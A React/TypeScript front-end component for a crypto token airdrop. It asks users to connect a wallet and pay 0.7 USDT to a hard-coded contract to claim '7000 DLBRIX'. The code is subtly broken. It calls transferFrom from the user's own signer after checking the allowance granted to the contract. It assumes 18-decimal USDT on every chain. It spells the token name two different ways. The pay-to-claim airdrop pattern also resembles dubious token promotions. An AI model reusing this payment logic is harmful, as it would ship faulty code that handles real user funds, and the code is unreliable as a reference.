"use client";

import React, { useCallback, useEffect, useState } from "react";
import MyContractABI from "../utils/MyContract.json";
import USDTABI from "../utils/USDT.json";
import { Web3Provider } from "@ethersproject/providers";
import { parseUnits, formatUnits } from "@ethersproject/units";
import { BigNumber } from "@ethersproject/bignumber";
import { Contract } from "@ethersproject/contracts";

const contractAddress = "0x464fD44452BDBB188ec4d0a0b12D05ccd629e76d"; 

const usdtAddresses = {
  Ethereum: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  BinanceSmartChain: "0x55d398326f99059fF775485246999027B3197955",
  Polygon: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
  Avalanche: "0xc7198437980c041c805a1edcba50c1ce5db95118",
};

interface Window {
  ethereum?: any;
}
declare const window: Window & typeof globalThis;

interface ClaimAirdropProps {
  contract: Contract | null;
  signer: ReturnType<Web3Provider['getSigner']> | null;
}

const ContractInteract: React.FC = () => {
  const [contractName, setContractName] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState<string | null>(null); 
  const [signer, setSigner] = useState<ReturnType<Web3Provider['getSigner']> | null>(null);
  const [contract, setContract] = useState<Contract | null>(null);
  const [airdropAmount, setAirdropAmount] = useState<string | null>(null);
  const [isClaiming, setIsClaiming] = useState(false);

  const checkNetwork = useCallback(async () => {
    const networkId = await window.ethereum.request({ method: "net_version" });
    switch (networkId) {
      case '1': return 'Ethereum';
      case '56': return 'BinanceSmartChain';
      case '137': return 'Polygon';
      case '43114': return 'Avalanche';
      default: throw new Error("Unsupported network");
    }
  }, []);

  const getUsdtAddress = useCallback(async () => {
    const network = await checkNetwork();
    return usdtAddresses[network];
  }, [checkNetwork]);

  useEffect(() => {
    const initProvider = async () => {
      setLoading(true);

      try {
        if (!window.ethereum) throw new Error("You should connect your wallet to claim 7000 DLBRIX for only 0.7 USDT.");
        await window.ethereum.request({ method: "eth_requestAccounts" });

        const provider = new Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const contract = new Contract(contractAddress, MyContractABI, signer);

        const usdtAddress = await getUsdtAddress();
        console.log(`Using USDT address: ${usdtAddress}`);

        const name = await contract.name();
        setContractName(name);
        setSigner(signer);
        setContract(contract);
        setMessage(null);
      } catch (e: any) {
        setMessage("Please connect your wallet to claim 7000 DLBRIX for only 0.7 USDT.");
      } finally {
        setLoading(false);
      }
    };

    if (window.ethereum) {
      initProvider();
    } else {
      setLoading(false);
    }
  }, [getUsdtAddress]);

  const claimAirdrop = async () => {
    if (!contract || !signer || isClaiming) {
      setMessage("Please connect your wallet to claim 7000 DLBRIX for only 0.7 USDT.");
      return;
    }

    setIsClaiming(true);
    setLoading(true);

    try {
      const usdtAddress = await getUsdtAddress();
      const usdtContract = new Contract(usdtAddress, USDTABI, signer!);

      const userAddress = await signer!.getAddress();
      const requiredUSDTAmount = parseUnits("0.7", 18);

      const userUSDTBalance = await usdtContract.balanceOf(userAddress);
      if (BigNumber.from(userUSDTBalance).lt(requiredUSDTAmount)) {
        setMessage("Your balance is insufficient to claim 7000 DLBRIX for only 0.7 USDT.");
        setLoading(false);
        setIsClaiming(false);
        return;
      }

      const userUSDTAllowance = await usdtContract.allowance(userAddress, contractAddress);
      if (BigNumber.from(userUSDTAllowance).lt(requiredUSDTAmount)) {
        setMessage("Please approve 0.7 USDT to claim 7000 DLBRIX.");
        setLoading(false);
        setIsClaiming(false);
        return;
      }

      const tx = await usdtContract.transferFrom(userAddress, contractAddress, requiredUSDTAmount);
      await tx.wait();

      const airdropTx = await contract.claimAirdrop();
      await airdropTx.wait();

      const airdropAmount = await contract.balanceOf(userAddress);
      setAirdropAmount(formatUnits(airdropAmount, 18));
      setMessage(`Congratulations! You have successfully claimed ${formatUnits(airdropAmount, 18)} DLBRIX.`);
      console.log("Airdrop Claimed:", airdropAmount);
    } catch (e: any) {
      setMessage(`An error occurred: ${e.message}`);
    } finally {
      setIsClaiming(false);
      setLoading(false);
    }
  };

  return (
    <div>
      <h1>Contract Interaction</h1>
      {loading && <p>Loading...</p>}
      {message && <p style={{ color: 'green', fontSize: 'medium' }}>{message}</p>}
      {window.ethereum ? (
        <>
          {contractName && <p>Name: {contractName}</p>}
          <button 
            onClick={claimAirdrop} 
            disabled={isClaiming}
            style={{ 
              fontSize: '2rem', 
              padding: '12px 24px',
              backgroundColor: '#007BFF', 
              color: 'white',
              border: 'none',
              borderRadius: '8px'
            }}>
            {isClaiming ? "Claiming..." : "Claim Airdrop Direct"}
          </button>
          {airdropAmount && <p>Airdrop Amount Claimed: {airdropAmount}</p>}
        </>
      ) : (
        <p style={{ color: 'green', fontSize: 'medium' }}>Please connect your wallet to claim 7000 DLBRX for only 0.7 USDT.</p>
      )}
    </div>
  );
};

export default ContractInteract;
